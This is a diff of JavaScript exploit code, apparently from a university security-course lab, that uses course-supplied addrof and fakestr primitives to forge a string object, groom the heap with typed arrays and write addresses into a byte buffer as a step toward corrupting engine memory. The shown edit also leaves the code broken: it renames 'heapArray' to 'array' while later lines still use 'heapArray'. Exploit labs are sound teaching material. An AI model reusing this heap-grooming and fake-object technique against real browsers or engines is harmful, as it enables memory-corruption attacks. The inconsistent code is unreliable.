@@ -4,16 +4,11 @@
 let dataPlane = new Uint32Array(1);
 let fakestring = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);
 
-let heapArray = new Uint32Array(72);
+let array = new Uint32Array(72);
 while (cs361s.addrof(heapArray) < cs361s.addrof(fakestring) || cs361s.addrof(heapArray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
     array = new Uint32Array(72);
 }
-let testing = function(){
-    print('Test');
-    print(cs361s.addrof(fakestring));
-    print(cs361s.addrof(fakestring) - 56);
-    print(cs361s.addrof(fakestring) - 56 + (2 ** 28));
-};
+
 let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakestring) + 16);
 let codes = new Uint8Array(72);
 
@@ -35,18 +30,6 @@ while(fb < 8) {
     codes[72 - 16 + fb] = temp % 256;
     fb++;
 }
-
-/*
-// write the bytes we want into the data plane
-for (var i = 0; i < 8; i++) {
-    let temp = cs361s.addrof(dataPlane);
-    for (var k = 0; k < i; k++) {
-        temp = temp - bytes[56 + k];
-        temp = temp / 256;
-    }
-    bytes[56 + i] = temp % 256;
-}
-*/
 
 // create the control plane
 codes[0] = codes[0] + 1;
